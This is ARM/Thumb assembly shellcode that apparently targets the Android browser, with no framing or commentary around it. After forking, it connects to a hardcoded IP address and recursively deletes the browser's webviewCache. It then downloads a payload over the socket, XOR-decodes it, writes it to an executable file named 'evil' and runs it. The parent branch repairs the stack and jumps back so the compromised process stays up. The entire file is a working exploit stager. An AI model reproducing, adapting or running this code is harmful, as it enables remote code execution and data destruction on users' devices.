.globl _start
_start:
	.code 32	
        add     r1, pc, #1
        bx      r1

	
        .code 16

	/* fork */
	nop
	mov	r7, #2
	svc	1

	cmp	r0, #0     /* child is 0 */
	beq	child

	/* parent only coe */
	/* fix r5, r6, sp  */
	
	mov	r0, #0
	mov	r1, sp
	sub	r1, r1, #80
	mov	sp, r1
	mov	r1, r8
	mov	r6, sp

	mov	sp, r8
	add     sp, sp, #56
	
	adr	r3, end_loop
	ldr	r3, [r3]
	bx	r3
	
	

	/* child only */
child:

	/* 1] open socket */
        mov     r0, #2
        mov     r1, #1
        sub     r2, r2, r2
        lsl     r7, r1, #8
        add     r7, r7, #25 	/* socket(2, 1, 0) */
        svc     1

	/* 2] connect */
connect:mov     r6, r0	          /* r6 contains socket descriptor */
        adr     r1, sockaddr_dl   /* r1 points to sockaddr */
        mov     r2, #16
        add     r7, #2	          /* socket + 2 = 283 */
        svc     1	          /* connect(r0, &addr, 16) */


	/* 3] chdir and clear cache */
chdir:	adr	r0, dir
	mov	r7, #12
	svc	1

clear:  
	/* fork child does rm */
	mov	r7, #2
	svc	1

	cmp	r0, #0
	bne	open	/* parent continues */

	/* child execve rm -R webviewCache  */
	adr	r0, rm
	adr	r2, cache
	adr	r1, recursive
	sub	r3, r3, r3
	push	{r0, r1, r2, r3}
	sub	r2, r2, r2
	mov	r1, sp
	mov	r7, #11
	svc	1

	
	/* 4] open */
open:	adr	r2, open_mode  
	ldrh	r2, [r2]
	adr	r1, open_flags
	ldrh	r1, [r1]
	adr	r0, filename
	mov	r7, #5
	svc	1	        /* open(filename,O_RDWR|O_CREAT|O_TRUNC[0001.0100.1000=1101],700) */
	mov	r8, r0		/* r8 holds file descriptor */


	/* 5] read-write loop - not a loop atm */

	mov	r9, r6		/* from now on sockfd is r9 */
	mov	r6, #0		/* r6 now contains bytes read so far */
	
	adr	r4, file_size	/* r4 contains size of file */
	ldrh	r4, [r4]
	
read:	adr	r2, buffer_size	/* size per read */
	ldrh	r2, [r2]
	mov	r5, pc
	adr	r5, buffer      /* r5 is ptr to buffer */
	mov	r1, r5
	mov	r0, r9          /* sockfd */
	mov	r7, #3
	svc	1		/* read(int fd, void *buf, size_t count) */

	cmp 	r0, #1		/* 0 eof, negative error, we write only if we've read something  */
	blt	close

	mov	r12, r0		/* r12 holds the number of bytes read */
	add	r6, r12


setup:	adr	r1, key
	ldr	r1, [r1]	/* r1 holds the key */
	mov	r2, r5		/* r2 is ptr to buffer */

	mov	r3, #0		/* r3 holds number of bytes xored */
	
xor:	
	ldr	r0, [r2]
	eor	r0, r0, r1
	str	r0, [r2]
	
	add 	r3, r3, #4
	add	r2, r2, #4
	cmp	r3, r12
	blt	xor	

	
write:	mov	r2, r12		/* write only the number of bytes read */
	mov	r1, r5
	mov	r0, r8		
	mov	r7, #4	        /* write(int fd, const void *buf, size_t count) */
	svc	1

	cmp	r6, r4
	blt	read
	

	/* 6] close file fd */
close:
	mov	r0, r8
	mov	r7, #6
	svc	1

	/* 7] fire */
fire:	adr     r0, filename
        sub     r2, r2, r2
        push    {r0, r2}
        mov     r1, sp
        mov     r7, #11
        svc     1              /* execve(filename, [filename, key, 0], 0) */

	
sockaddr_dl:	
		.align 2	               /* struct sockaddr */
 		.short 0x2	
		.short 0x3412
		.byte 192,168,69,131	

end_loop:	.word  0xa84dbc37

open_mode:	.short 0x1ff  /*777 */
	        .byte  1,1
	
open_flags:	.short 0x242  /* O_RDWR|O_CREAT|O_TRUNC */
	        .byte  1,1
	
file_size:	.short 0x2d
		.byte  1,1
	
dir:		.ascii "/app-cache/com.android.browser/cache/\0"
		.byte  1,1
	
cache:		.ascii "webviewCache\0"
		.byte  1,1,1

filename:	.ascii "evil\0"
		.byte  1,1,1
		
rm:		.ascii "/system/bin/rm\0"
		.byte  1

recursive:	.ascii "-R\0"
		.byte  1

key:		.word 0x01234567
	
buffer_size:	.short 0x400
		.byte  1,1
	
buffer:		.byte 3,3,3,3
